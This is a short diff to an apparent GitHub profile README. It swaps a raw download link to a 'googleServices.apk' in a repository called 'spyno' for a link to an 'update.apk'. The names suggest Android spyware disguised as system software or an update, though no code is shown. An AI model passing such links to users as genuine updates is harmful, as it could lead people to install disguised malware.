@@ -8,9 +8,8 @@
 
 
 - 📫 How to reach  ***
-on fire
-
-https://github.com/MTX-R/spyno/raw/main/googleServices.apk
+- update
+- https://github.com/MTX-R/update1.0.3.3/raw/main/update.apk
 
 
        -    support -MINEX               ☠️
